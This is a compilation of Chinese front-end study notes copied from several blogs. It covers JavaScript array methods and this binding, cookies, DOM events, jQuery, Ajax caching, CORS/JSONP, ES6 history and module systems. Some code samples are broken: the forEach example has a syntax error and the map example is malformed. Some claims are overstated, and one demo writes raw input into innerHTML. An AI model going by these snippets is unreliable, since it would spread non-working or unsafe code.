### .map() 与 this 具体使用场景分析
```
https://www.cnblogs.com/mhtss/p/11334034.html
相同点：

1.都是循环遍历数组中的每一项

2.每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组）

3.匿名函数中的this都是指向window

4.只能遍历数组

 

不同点：

map（）

map方法返回一个新的数组，数组中的元素为原始数组调用函数处理后的值

也就是map（）进行处理之后返回一个新的数组

⚠️注意：map（）方法不会对空数组进行检测

map方法不会改变原始数组

var arr = [0,2,4,6,8];
var str = arr.map(function(item,index,arr){
console.log(this); //Window
console.log(this);
console.log(item);
console.log('原数组arr：',arr); // 会执行五次
return item/2;},this);console.log(str); //[0,1,2,3,4]
forEach

 

forEach方法用于调用数组的每个元素，将元素传给回调函数

⚠️注意： forEach对于空数组是不会调用回调函数的 ，

没有返回一个新数组&没有返回值

应用场景：为一些相同的元素，绑定事件处理器！

不可链式调用 

var arr = [0,2,4,6,8]

var sum =0;

var str = arr.forEach(item,index.arr){sum+= item;console.log("sum的值为：",sum);})


分享文章如有侵权，版权等问题，请私信联系我，我将第一时间删除或修正。
https://blog.csdn.net/weixin_42881768/article/details/104648611
1、
       默认绑定：没有明确隶属对象的函数，被直接执行，一般都是window（默认绑定this）；

2、
       隐式绑定：有所属对象的函数，被执行，一般是当前函数的所属对象（隐式绑定this）；
       隐式丢失：如果作为参数，传到另一个函数中，那么丢失原本的对象，变成window。

3、
       强制绑定：利用函数的方法（call、apply、bind），改成谁，this就是谁；

4、
       new绑定：函数被new执行后，函数内部的this会指向new出来的实例。

注意：this永远跟着当前函数走，this永远是一个对象，永远在执行时才能确定指向

扩展：
       ES6中的箭头函数没有自己的this，指向外层this，函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。
```

### Cookie 读写
```
https://www.cnblogs.com/rxbook/p/11773553.html
<!doctype html>
<html>
    
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>
            test
        </title>
    </head>
    
    <body>
        <script type="text/javascript">
            //写cookies
            function setCookie(name, value) {
                var Days = 30;
                var exp = new Date();
                exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
                document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
            }

            //读取cookies 
            function getCookie(name) {
                var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");

                if (arr = document.cookie.match(reg)) return unescape(arr[2]);
                else return null;
            }

            //删除cookies 
            function delCookie(name) {
                var exp = new Date();
                exp.setTime(exp.getTime() - 1);
                var cval = getCookie(name);
                if (cval != null) document.cookie = name + "=" + cval + ";expires=" + exp.toGMTString();
            }
            setCookie("name", "peter");
            setCookie("sex", "man");
            setCookie("age", "19");

            console.log(getCookie("name"));
            console.log(getCookie("sex"));
            console.log(getCookie("age"));
        </script>
    </body>

</html>
```

### JQuery 操作
```
https://www.cnblogs.com/gaohuayan/p/11304745.html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>操作页面的三步骤</title>
</head>
<body>
    <h1>操作页面的三步骤</h1>
    <div class="box">
        <h1>box h1</h1>
    </div>
</body>
<script>
    // 1、获取页面标签
    // 2、设置操作的激活条件 - 事件
    // 3、具体的操作方式 - 内容 | 样式 | 事件 | 文档结构

    // 1
    let body = document.querySelector('body');
    let box = document.querySelector('.box');
    // 父级调用选择器方法，只完成自己内部的检索
    let body_h1 = body.querySelector('h1');
    console.log(body_h1);
    let box_h1 = box.querySelector('h1');
    console.log(box_h1);

    // 2
    body_h1.onclick = function () {
        // console.log('你丫点我了')
        // 3
        if (box_h1.style.color != 'red') {
            box_h1.style.color = 'red';
            box_h1.style.backgroundColor = 'orange';
        } else {
            box_h1.style.color = 'black';
            box_h1.style.backgroundColor = 'white';
        }
    }
</script>
</html>
js事件
鼠标事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>鼠标事件</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: pink;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="box"></div>
</body>
<script>
    let box = document.querySelector('.box');
    // 单击
    box.onclick = function () {
        console.log('单击了', this)
    };
    // 双击
    box.ondblclick = function () {
        console.log('双击了')
    };
    // 右键
    box.oncontextmenu = function () {
        console.log('右键了');
        // 有些事件有系统默认动作，取消默认动作可以返回 false
        return false;
    };
    // 悬浮
    box.onmouseover = function () {
        console.log('悬浮了');
    };
    // 移开
    box.onmouseout = function () {
        console.log('移开了');
    };
    // 移动
    box.onmousemove = function () {
        console.log('移动了');
    };
    // 按下
    box.onmousedown = function () {
        console.log('按下了');
    };
    // 抬起
    box.onmouseup = function () {
        console.log('抬起了');
    };
</script>
</html>
文档事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>文档事件</title>
    <style>
        body {
            height: 3000px;
        }
    </style>
    <script>
        // 页面加载成功
        window.onload = function () {
            console.log(h1)
        }
    </script>
</head>
<body>
    <h1 id="h1">hhhhh</h1>
</body>
<script>
    let body = document.querySelector('body');
    // 页面滚动事件
    document.onscroll = function (ev) {
        console.log('滚动了');
        // console.log(ev);
        // console.log(window.scrollY);
        if (window.scrollY >= 500) {
            body.style.backgroundColor = 'red';
        } else {
            body.style.backgroundColor = 'white';
        }
    }
</script>
</html>
键盘事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>键盘事件</title>
</head>
<body>
    <h1>键盘事件</h1>
    <input type="text">
</body>
<script>
    let inp = document.querySelector('input');

    inp.onkeydown = function () {
        console.log('按下')
    };
    inp.onkeyup = function () {
        console.log('抬起')
    }

</script>
</html>
表单事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>表单事件</title>
    <style>
        /*表单的内外边框*/
        input {
            border: 2px solid pink;
        }
        input:focus {
            outline: 2px solid yellow;
        }
    </style>
</head>
<body>
<form action="">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="登录">
</form>
</body>
<script>
    let form = document.querySelector('form');
    let submit = document.querySelector('[type="submit"]');
    let usr = document.querySelector('[type="text"]');

    // 表单提交事件：表单默认也有提交数据的动作，也可以取消
    form.onsubmit = function () {
        console.log('提交了');
        return false;
    };

    // 获取焦点
    usr.onfocus = function () {
        console.log('获取焦点')
    };

    // 失去焦点
    usr.onblur = function () {
        console.log('失去焦点')
    };

</script>
</html>
事件对象
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>事件对象</title>
</head>
<body>
<input type="text" class="inp">
</body>
<script>
    inp = document.querySelector('.inp');
    inp.onkeydown= function (ev) {
        console.log(ev);
        // console.log(ev.keyCode);

        if (ev.keyCode === 13) {
            console.log('回车了')
        }
        if (ev.ctrlKey && ev.keyCode === 13) {
            console.log('消息发送了')
        }
    };

    document.onclick = function (ev) {
        console.log(ev);
        // 鼠标点击点
        console.log(ev.clientX, ev.clientY);
    }
    
</script>
</html>
js操作内容
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>内容操作</title>
</head>
<body>
    <h1 class="title">标题</h1>
    <input type="text" class="title">
    <button class="btn">改标题</button>
</body>
<script>
    let h1 = document.querySelector('h1.title');
    let inp = document.querySelector('input.title');
    let btn = document.querySelector('.btn');

    // 内容操作：value | innerText | innerHTML
    btn.onclick = function () {
        // 拿到输入框的内容
        inp_value = inp.value;
        if (inp_value) {
            // inp_value = '';  // 改的只是一个内存变量
            inp.value = '';  // 清空输入框

            // 将内容赋值给h1 innerText | innerHTML
            // console.log(h1.innerText);
            // console.log(h1.innerHTML);
            // 纯文本
            // h1.innerText = inp_value;
            // 文本中的标签会被解析
            h1.innerHTML = inp_value;
        }
    }
</script>
</html>
js操作样式
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>样式操作</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: pink;
        }
        .sup-box {
            /*width: 400px;*/
            height: 100px;
            background-color: orange;
            border-radius: 50%;
            line-height: 100px;
            text-align: center;
            color: red;
        }
    </style>
</head>
<body>
    <!--<div class="box" style="background-color: deeppink;"></div>-->
    <div class="box">文本</div>
</body>
<script>
    let box = document.querySelector('.box');
    // 需求1：单击获取标签的之前背景颜色
    /*
    box.onclick = function () {
        // 注：this.style 本质操作的是行间式（只能获取和设置行间式）
        // bgColor = this.style.backgroundColor;
        // console.log(bgColor);

        // 注：在内联和外联中书写的样式称之为 计算后样式

        // 注：getComputedStyle 能获取计算后样式，也能获取行间式，但是只读
        // getComputedStyle(标签, 伪类).样式;
        bgColor = getComputedStyle(this, null).backgroundColor;
        console.log(bgColor);
        width = getComputedStyle(this, null).width;
        console.log(width, parseInt(width));

        // 只读，会报错
        // getComputedStyle(this, null).backgroundColor = 'rgb(255, 20, 147)';
    }
    */

    // 需求2：点击修改标签的宽高背景颜色
    /*
    box.onclick = function () {
        this.style.backgroundColor = 'orange';
        this_style = getComputedStyle(this, null);
        // console.log(parseInt(this_style.width) * 2);
        // 宽放大两倍，高缩小两倍
        this.style.width = parseInt(this_style.width) * 2 + 'px';
        this.style.height = parseInt(this_style.height) / 2 + 'px';
    }
    */
    
    // 需求：操作计算后样 - 提取写好计算后样式，通过类名将 js 与 css 建立关联
    box.onclick = function () {
        console.log(this.className);
        // this.className = 'sup-box';

        /*
        if (this.className === 'box') {
            this.className = 'sup-box';
        } else {
            this.className = 'box';
        }
        */
        // 注：有个空格：空格sup-box
        // this.className += ' sup-box';

        if (this.className === 'box') {
            this.className += ' sup-box';
        } else {
            this.className = 'box';
        }
    };
</script>
</html>
页面转跳
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>页面转跳</title>
</head>
<body>
    <button class="b1">自我刷新</button>
    <button class="b2">转跳到9</button>
    <button class="b3">ctrl新开转跳到9</button>
</body>
<script>
    window.owen = 'Owen';
    let b1 = window.document.querySelector('.b1');
    // 自我刷新
    b1.onclick = function () {
        // console.log(owen);

        // '' 代表当前页面链接
        // window.location.href = '';
        location.reload();
    };

    let b2 = window.document.querySelector('.b2');
    // 转跳到9*.html
    b2.onclick = function () {
        // 在自身所在标签替换
        window.location.href = '9、样式操作.html';
    };

    // ctrl新开转跳到9
    let b3 = window.document.querySelector('.b3');
    b3.onclick = function (ev) {
        // open('转跳路径', '默认就是_blank')
        if (ev.ctrlKey) {
            window.open('9、样式操作.html');
        } else {
            window.open('9、样式操作.html', '_self');
        }
    }
</script>
</html>
屏幕有滚动条下的两种宽度
去除滚动条剩余的全部宽度
let html = document.querySelector('html');
console.log(html.clientWidth);
不去除滚动条剩余的全部宽度
function getHtmlWidth() {
    let hidden = document.createElement('div');
    hidden.style.width = '100vw';
    html.appendChild(hidden);
    width = parseInt(getComputedStyle(hidden, null).width);
    html.removeChild(hidden);
    return width
}
width = getHtmlWidth();
console.log(width);
案例：动态尺寸
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>动态尺寸</title>
    <style>
        body {
            margin: 0;
            height: 3000px;
        }
        .box {
            /*width: 200px;*/
            /*height: 200px;*/
            /*width: 100%;*/

            background-color: orange;
            position: fixed;
            top: 0;
            left: 0;

            min-width: 900px;
            max-width: 1100px;

            width: 90%;
            margin-left: 5%;

            /*vw viewwidth  vh viewheight*/
            /*width: 90vw;*/
            /*margin-left: 5vw;*/
        }
    </style>
</head>
<body>
    <div class="hidden" style="width: 100vw"></div>
    <div class="box"></div>
</body>
<script>
    let html = document.querySelector('html');

    // 去除滚动条的宽度
    console.log(html.clientWidth);

    // 包含滚动条的宽度
    // let hidden = document.querySelector('.hidden');
    // width = parseInt(getComputedStyle(hidden, null).width);
    // console.log(width);

    function getHtmlWidth() {
        let hidden = document.createElement('div');
        hidden.style.width = '100vw';
        html.appendChild(hidden);
        width = parseInt(getComputedStyle(hidden, null).width);
        html.removeChild(hidden);
        return width
    }
    width = getHtmlWidth();
    console.log(width);



    function resizeBox() {
        box_width = parseInt(getComputedStyle(box, null).width);
        box.style.height = box_width / 6 + 'px';
        if (box_width >= 1100) {
            box.style.marginLeft = (html.clientWidth - 1100) / 2 + 'px'
        }
    }

    let box = document.querySelector('.box');
    resizeBox();

    window.onresize = function () {
        resizeBox();
    };
</script>
</html>
jq API
http://jquery.cuishifeng.cn/
jq初始
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq初始</title>
</head>
<body>
    <h1>jQuery就是js的工具库 - 一系列功能的集合体</h1>
    <h2>jq内部语法采用的就是原生js</h2>
    <h2>jq环境如何搭建 - 在需要使用jq的html中引入jquery.js即可</h2>
    <h2>jq就是优化了原生js鱼页面进行交互的逻辑</h2>
</body>

<!-- CDN 连接 外部资源 -->
<!--<script src="https://code.jquery.com/jquery-3.4.1.js"></script>-->
<!--<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>-->

<script src="js/jquery-3.4.1.js"></script>
<script>
    // jQuery对象
    console.log(jQuery);
    console.log($);
    console.log(Owen);

    console.log($('h1'));
    $('h1').click(function () {
        $('h1').css('color', 'red')
    })
</script>
</html>
jq选择器
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Title</title>
</head>
<body>
    <div id="d" class="box"></div>
    <input type="text" id="d2" class="box" />
    <h3 class="h3"></h3>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    // jq选择器：$('css选择器语法')
    let $div = $('#d');
    console.log($div);

    let $boxs = $('.box');
    console.log($boxs);

    // jq对象如何转换为js对象 - jq对象可以理解为装有js对象的数组
    // 就是通过索引取值
    let div = $div[0];
    console.log(div);

    console.log(document.getElementsByClassName('box')[0]);
    console.log(document.querySelectorAll('.box')[0]);
    console.log($div[0]);
    console.log($boxs[0]);
    console.log($boxs[1]);

    // js如何转换为jq对象
    let $newDiv = $(div);
    console.log($newDiv);

</script>
</html>
jq事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq事件</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: orange;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="box">1</div>
    <div class="box">2</div>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    let $box = $('.box');
    // $box.click(function () {
    //     // this就是被点击的标签 - js对象
    //     console.log(this);
    //     console.log($(this));
    // });

    // jq对象可以完成事件的批量绑定
    $box.on('click', function () {
        console.log(this);
        console.log(this.innerText);
        console.log($(this));
    });

    // js必须手动循环 绑定
    // let boxs = document.querySelectorAll('.box');
    // for (box of boxs) {
    //     box.onclick = function () {
    //         console.log(this);
    //         console.log($(this));
    //     }
    // }

</script>
</html>
jq内容操作
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq内容操作</title>
</head>
<body>
    <h1 class="title">标题</h1>
    <input type="text" class="title">
    <button class="btn">改标题</button>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    // js - jsObj.value | jsObj.innerText | jsObj.innerHTML
    // jq - jqObj.val() | jqObj.text() | jqObj.html()
    // 取值：jqObj.text() | jqObj.text('新值') | jqObj.text(fn)

    let $btn = $('.btn');
    let $inp = $('input.title');
    let $h1 = $('h1.title');

    $btn.click(function () {
        let val = $inp.val();
        if (val) {
            // $h1.text(val);
            $h1.html(val);
            $inp.val(function (index, oldValue) {
                // return oldValue.toUpperCase()
                return ''
            })
        }
    })
</script>
</html>
jq样式操作
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq样式操作</title>
    <style>
        .box {
            /*width: 200px;*/
            height: 200px;
            background-color: pink;
        }
        .sup-box {
            /*width: 400px;*/
            height: 100px;
            background-color: orange;
            border-radius: 50%;
            line-height: 100px;
            text-align: center;
            color: red;
        }
    </style>
</head>
<body>
    <div class="box" style="width: 600px">文本</div>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    let $box = $('.box');

    $box.click(function () {
        // 获取
        let width = $box.css('width');
        console.log(width);

        // 单个设置
        $box.css('background-color', function (i, o) {
            console.log(o);
            return 'red'
        });

        // 多条设置
        $box.css({
            width: '100px',
            height: '100px',
            backgroundColor: 'blue',
        });

        if ($box.hasClass('sup-box')) {
            $box.removeClass('sup-box')
        } else {
            $box.addClass(function (i, o) {
                console.log(i, o);
                return 'sup-box'
            })
        }
    })
    
</script>
<script>
    // localStorage['name'] = 'owen';
    // sessionStorage['age'] = 18;
</script>
</html>

```

### Ajax 请求（同步、异步区别）随机数禁止缓存
```
https://www.cnblogs.com/liu-zhao/p/7055250.html
看到别人写的JS，ajax请求地址后加随机参数，比如XXXX?t= + new Date().getTime()。

一开始搞不懂为什么，网上查了资料，原因是防止浏览器缓存。

浏览器为了提高用户访问同一页面的速度，会对页面数据进行缓存。当url请求地址不变时，

有时候会导致浏览器不发送请求，直接从缓存中读取之前的数据。

如果数据改变了，而没加随机数，读取的数据会跟之前一样。

加上随机数，就是欺骗浏览器url改变了，会每次都向服务器发送请求而不去读缓存
```

### Bootstrap 有什么好处
```
https://www.php.cn/bootstrap/425318.html
BootStrap的好处：

Bootstrap响应式布局设计,让一个网站可以兼容不同分辨率的设备，使得开发者可以方便的让网页无论在台式机、平板设备、手机上都获得最佳的体验。给用户提供更好的视觉使用体验。

BootStrap简介：

Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。

2011年，twitter的“一小撮”工程师为了提高他们内部的分析和管理能力，用业余时间为他们的产品构建了一套易用、优雅、灵活、可扩展的前端工具集--BootStrap。Bootstrap由MARK OTTO和Jacob Thornton所设计和建立，在github上开源之后，迅速成为该站上最多人watch&fork的项目。大量工程师踊跃为该项目贡献代码，社区惊人地活跃，代码版本进化非常快速，官方文档质量极其高(可以说是优雅)，同时涌现了许多基于Bootstrap建设的网站：界面清新、简洁;要素排版利落大方。

Bootstrap 特点：

简单灵活可用于架构流行的用户界面和交互接口的html、css、javascript工具集。

基于html5、css3的bootstrap，具有大量的诱人特性：友好的学习曲线，卓越的兼容性，响应式设计，12列格网，样式向导文档。
```

### 跨域请求 N 种解决方案
```
https://www.cnblogs.com/momo798/p/6164124.html
一、同源策略：
说到跨域请求，首先得说说同源策略：

1995年，同源政策是由 Netscape 公司引入浏览器的。目前，所有浏览器都实行了这个政策。

同源策略是浏览器的一种安全策略，所谓同源是指，域名，协议，端口完全相同；目的就是为了保证用户信息的安全，防止恶意的网站窃取数据，防范跨站脚本的攻击，禁止客户端脚本（如 JavaScript）对不同域的服务进行跨站调用。

同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。

举例来说，http://www.example.com/dir/page.html 这个网址
协议是 http://
域名是 www.example.com
端口是 80（默认端口可以省略）
它的同源情况如下：
同源：
http://www.example.com/dir2/other.html
不同源：
http://example.com/dir/other.html：不同源（域名不同）
http://v2.www.example.com/dir/other.html：不同源（域名不同）
http://www.example.com:81/dir/other.html：不同源（端口不同）

二、跨域请求：
所谓的跨域访问或者跨域请求，就是是指通过 js 在不同的域之间进行数据传输或通信，比如用ajax向一个不同的域请求数据，或者通过js获取页面中不同域的框架中(iframe)的数据。只要协议、域名、端口有任何一个不同，都被当作是不同的域。

但不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。

三、跨域解决的常用方法：
 项目中常用的两种解决方案主要是：JSONP、CORS及nginx。

1、JSONP：

基本思想就是：网页通过添加一个<script src=‘’>元素，向服务器请求JSON数据（<script> 的src属性获得js代码， 不受同源政策限制）。服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。

注：用 JSONP 获取的不是 JSON 数据，而是可以直接运行的 JavaScript 语句。由于script脚本只可以通过get发送请求，所以jsonp这种方法只可以发送get请求，无法发送post请求。

具体做法：使用jQuery封装的Ajax，只需在客户端的Ajax请求的url中加入url?callback=?即可；

　　　　　服务器端需写入var callback = req.query.callback；返回的value需要封装成json，res.send(callback+'('+json+')')。

2、CORS（Cross-Origin Resource Sharing）：

跨域资源共享是一份浏览器技术的规范，以避开浏览器的同源策略，是 JSONP 模式的现代版。

CORS背后的思想，就是使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。

与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。用 CORS 可以让前端工程师用一般的 XMLHttpRequest，这种方式的错误处理比 JSONP 要来的好；另一方面，JSONP 可以在不支持 CORS 的老旧浏览器上运作。现代的浏览器都支持 CORS。

具体做法：客户端不需要做什么，只需要在服务器端发送一个响应头即可：‘Access-Control-Allow-Origin’；

　　　　   如若允许所有域访问：Access-Control-Allow-Origin: *；如：header("Access-Control-Allow-Origin: *")；

　　　　　如若只允许指定域访问：Access-Control-Allow-Origin: 域名A；如：header("Access-Control-Allow-Origin: http://www.test2.com");

3. nginx：

Nginx是一个高性能的 HTTP 和反向代理服务器，也是一个 IMAP/POP3/SMTP 服务器，是一款轻量级的 Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。由于浏览器有同源策略，导致不能跨域接收或发请求，但服务器与服务器之间的通信是没有限制的，所以可以理解为，nginx 与服务器通信后，将请求转发回浏览器。

首先，nginx在启动时，会解析配置文件，得到需要监听的端口与ip地址，然后在nginx的master进程里面，先初始化好这个监控的socket(创建socket，设置addrreuse等选项，绑定到指定的ip地址端口，再listen)，再fork(一个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程)出多个子进程出来，子进程会竞争accept新的连接。此时，客户端就可以向nginx发起连接了。
当客户端与nginx进行三次握手，与nginx建立好一个连接后，某一个子进程会accept成功，得到这个建立好的连接的socket，然后创建nginx对连接的封装，即ngx_connection_t结构体。接着，设置读写事件处理函数并添加读写事件来与客户端进行数据的交换。
最后，nginx或客户端来主动关掉连接，到此，一个连接就完成了。
```

### ES6
```
https://www.runoob.com/w3cnote/es6-tutorial.html
ES6， 全称 ECMAScript 6.0 ，是 JavaScript 的下一个版本标准，2015.06 发版。

ES6 主要是为了解决 ES5 的先天不足，比如 JavaScript 里并没有类的概念，但是目前浏览器的 JavaScript 是 ES5 版本，大多数高版本的浏览器也支持 ES6，不过只实现了 ES6 的部分特性和功能。


你也可以先看 ECMAScript 6 简明教程 来先快速了解。

ECMAScript 的背景
JavaScript 是大家所了解的语言名称，但是这个语言名称是商标（ Oracle 公司注册的商标）。因此，JavaScript 的正式名称是 ECMAScript 。1996年11月，JavaScript 的创造者网景公司将 JS 提交给国际化标准组织 ECMA（European computer manufactures association，欧洲计算机制造联合会），希望这种语言能够成为国际标准，随后 ECMA 发布了规定浏览器脚本语言的标准，即 ECMAScript。这也有利于这门语言的开放和中立。

ECMAScript 的历史
ES6 是 ECMAScript 标准十余年来变动最大的一个版本，为其添加了许多新的语法特性。

1997 年 ECMAScript 1.0 诞生。
1998 年 6 月 ECMAScript 2.0 诞生，包含一些小的更改，用于同步独立的 ISO 国际标准。
1999 年 12 月 ECMAScript 3.0诞生，它是一个巨大的成功，在业界得到了广泛的支持，它奠定了 JS 的基本语法，被其后版本完全继承。直到今天，我们一开始学习 JS ，其实就是在学 3.0 版的语法。
2000 年的 ECMAScript 4.0 是当下 ES6 的前身，但由于这个版本太过激烈，对 ES 3 做了彻底升级，所以暂时被"和谐"了。
2009 年 12 月，ECMAScript 5.0 版正式发布。ECMA 专家组预计 ECMAScript 的第五个版本会在 2013 年中期到 2018 年作为主流的开发标准。2011年6月，ES 5.1 版发布，并且成为 ISO 国际标准。
2013 年，ES6 草案冻结，不再添加新的功能，新的功能将被放到 ES7 中；2015年6月， ES6 正式通过，成为国际标准。
ES6 的目标与愿景
成为更好编写的开发语言有以下目标。

适应更复杂的应用；实现代码库之间的共享；不断迭代维护新版本。
```

### 模块化
```
https://www.jianshu.com/p/8573cdcde863
模块化是一个语言膨胀的必经之路，它能够帮助开发者拆分和组织代码。

Module模式
在模块化规范形成之前，JS开发者使用Module设计模式来解决JS全局作用域的污染问题。Module模式最初被定义为一种在传统软件工程中为类提供私有和公有封装的方法。在JavaScript中，Module模式使用匿名函数自调用 (闭包)来封装，通过自定义暴露行为来区分私有成员和公有成员。

let myModule = (function (window) {
    let moduleName = 'module'  // private
    // public
    function setModuleName(name) {
      moduleName = name
    }
    // public
    function getModuleName() {
      return moduleName
    }
    return { setModuleName, getModuleName }  // 暴露行为
  })(window)
上面例子是Module模式的一种写法，它通过闭包的特性打开了一个新的作用域，缓解了全局作用域命名冲突和安全性的问题。但是，开发者并不能够用它来组织和拆分代码，于是乎便出现了以此为基石的模块化规范。

模块化规化
1. CommonJS
CommonJS主要用在Node开发上，每个文件就是一个模块，没个文件都有自己的一个作用域。通过module.exports暴露public成员。例如：

// 文件名：x.js
let x = 1;
function add() {
  x += 1;
  return x;
}
module.exports.x = x;
module.exports.add = add;
此外，CommonJS通过require()引入模块依赖，require函数可以引入Node的内置模块、自定义模块和npm等第三方模块。

// 文件名：main.js
let xm = require('./x.js');
console.log(xm.x);  // 1
console.log(xm.add());  // 2
console.log(xm.x);   // 1
从上面代码我们可以看出，require函数同步加载了x.js，并且返回了module.exports输出字面量的拷贝值。可能有人会问module.exports.x = x;不是赋值吗，怎么肥事呢？我们说，Module模式是模块化规范的基石，CommonJS也是对Module模式的一种封装。我们完全可以用Module模式来实现上面的代码效果：

let xModule = (function (){
  let x = 1;
  function add() {
    x += 1;
    return x;
  }
  return { x, add };
})();
let xm = xModule;
console.log(xm.x);  // 1
console.log(xm.add());  // 2
console.log(xm.x);   // 1
通过Module模式模拟的CommonJS原理，我们就可以很好的解释CommonJS的特性了。因为CommonJS需要通过赋值的方式来获取匿名函数自调用的返回值，所以require函数在加载模块是同步的。然而CommonJS模块的加载机制局限了CommonJS在客户端上的使用，因为通过HTTP同步加载CommonJS模块是非常耗时的。

2. AMD和CMD
2.1 AMD
// 定义AMD规范的模块
define([function() {
  return 模块
})
区别于CommonJS，AMD规范的被依赖模块是异步加载的，而定义的模块是被当作回调函数来执行的，依赖于require.js模块管理工具库。当然，AMD规范不是采用匿名函数自调用的方式来封装，我们依然可以利用闭包的原理来实现模块的私有成员和公有成员：

define(['module1', 'module2'], function(m1, m2) {
  let x = 1;
  function add() {
    x += 1;
    return x;
  }
  return { add };
})
2.2 CMD
CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。AMD 推崇依赖前置，CMD 推崇依赖就近。

define(function(require, exports, module) {
  //  同步加载模块
  var a = require('./a');
  a.doSomething();
  // 异步加载一个模块，在加载完成时，执行回调
  require.async(['./b'], function(b) {
    b.doSomething();
  });
  // 对外暴露成员
  exports.doSomething = function() {};
});
// 使用模块
seajs.use('path');
CMD集成了CommonJS和AMD的的特点，支持同步和异步加载模块。CMD加载完某个依赖模块后并不执行，只是下载而已，在所有依赖模块加载完成后进入主逻辑，遇到require语句的时候才执行对应的模块，这样模块的执行顺序和书写顺序是完全一致的。因此，在CMD中require函数同步加载模块时没有HTTP请求过程。

ES6 module
ES6的模块化已经不是规范了，而是JS语言的特性。随着ES6的推出，AMD和CMD也随之成为了历史。ES6模块与模块化规范相比，有两大特点：

模块化规范输出的是一个值的拷贝，ES6 模块输出的是值的引用。
模块化规范是运行时加载，ES6 模块是编译时输出接口。
模块化规范输出的是一个对象，该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，ES6 module 是一个多对象输出，多对象加载的模型。从原理上来说，模块化规范是匿名函数自调用的封装，而ES6 module则是用匿名函数自调用去调用输出的成员。两者的区别可参考Babel and CommonJS modules。
```

### 打包
```
http://www.fly63.com/article/detial/3628
1. 前言
1.1 前端
前端三剑客：结构层 html，表现层 css，行为层 JavaScript。

html好比是房子的地基，css和 JavaScript是房子的建筑材料，这三个部分一起组成个漂亮的房子。我们不能把他们分开说，某某部分是个房子，只有三个一起才能组成一个漂亮的房子 。



1.2 JavaScript 的简介（参考阮一峰的ES6入门简介）
这几年，JavaScript 发展非常快速，特别是在2015年，更是有一个质的飞跃。
1.2.1 ECMA
说到 JavaScript，就要说下Web标准的组织协会，ECMA，它是“European Computer Manufactures Association”的缩写，中文称 欧洲计算机制造联合会，1961年成立，旨在建立统一的电脑操作格式标准--包括程序语言和输入输出的组织。

1.2.2 JavaScript
2015年，JavaScript 引入许多新的语法糖，而且制定过程当中，还有很多组织和个人不断提交新功能。事情很快就变得清楚了，不可能在一个版本里面包括所有将要引入的功能。

常规的做法是先发布 6.0 版，过一段时间再发 6.1 版，然后是 6.2 版、6.3 版等等 ，这个2015年之前 JavaScript 现在习惯称为ECMAScript5，而之后称为ECMAScript6。

标准委员会商定后最终决定，标准在每年的 6 月份正式发布一次，作为当年的正式版本。接下来的时间，就在这个版本的基础上做改动，直到下一年的 6 月份，草案就自然变成了新一年的版本。这样一来，就不需要以前的版本号了，只要用年份标记就可以了。

因此，ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。

问题一：关于ECMAScript 和 JavaScript 是什么关系 ？
回答：从现在的角度来看，二者是可以互换的。即ECMAScript是JavaScript ，JavaScript 是ECMAScript。

问题二：ECMAScript 6 和 ECMAScript 2015 是什么关系 ?
回答：ECMAScript 6泛指下一代 JavaScript 语言，ECMAScript 2015指的是 2015年的 JavaScript 标准；

总结

// es6 泛指下一代 JavaScript 语言，当时部分人也会认为特指ES2015
ECMAScript6.0  =  ECMAScript2015 = es2015  =  es6(部分人会这么认为)
ECMAScript6.1  =  ECMAScript2016 = es2016  =  es7(部分人会这么认为)
ECMAScript6.2  =  ECMAScript2017 = es2017  =  es8(部分人会这么认为)
1.2.3 浏览器的遭遇
